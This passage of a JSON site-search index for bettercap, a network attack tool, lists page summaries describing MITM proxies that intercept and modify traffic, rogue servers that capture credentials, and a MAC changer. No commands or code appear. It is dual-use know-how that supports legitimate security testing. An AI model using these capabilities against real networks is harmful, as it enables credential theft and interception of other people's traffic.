passwords, cookies, etc of other people on your network ) to actively intercepting and proxying all the requests of some specific protocol in order to modify them on the fly ( you can, for instance, replace all images of all websites being visited by everyone, kill connections, etc ).\n"
},
{
	"uri": "https://bettercap.org/modules/ethernet/proxies/",
	"title": "Proxies",
	"tags": [],
	"description": "",
	"content": "A set of modules you can use to intercept traffic at the packet, TCP or HTTP/HTTPS level while performing a MITM attack. Each proxy can be either extended with the Go plugin system (when keeping high performances is important), or scripted with Javascript plugins thanks to the Otto builtin engine:\n any.proxy     packet.proxy     tcp.proxy     http.proxy     https.proxy     "
},
{
	"uri": "https://bettercap.org/modules/ethernet/servers/",
	"title": "Servers",
	"tags": [],
	"description": "",
	"content": "A set of servers used to serve files on a network or intercept credentials by exposing a rogue service:\n http.server     https.server     mysql.server (rogue)     "
},
{
	"uri": "https://bettercap.org/modules/utils/",
	"title": "Utils",
	"tags": [],
	"description": "",
	"content": "Various utility modules:\n mac.changer     gps     "
},
{
	"uri": "https://bettercap.org/",
	"title": "",
	"tags": [],
	"description": "",
	"content": "bettercap is the Swiss Army knife for WiFi, Bluetooth Low Energy, wireless HID hijacking and Ethernet networks reconnaissance and MITM attacks.\nRead the project introduction to get an idea of what bettercap can do for you, install it, RTFM and start hacking all the things!!!\nベッターキャップ！   Follow @bettercap  Star       Tweets by @bettercap\n"
},
{
	"uri": "https://bettercap.org/categories/",
	"title": "Categories",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://bettercap.org/tags/",
	"title": "Tags",
	"tags": [],
	"description": "",
	"content": ""
}]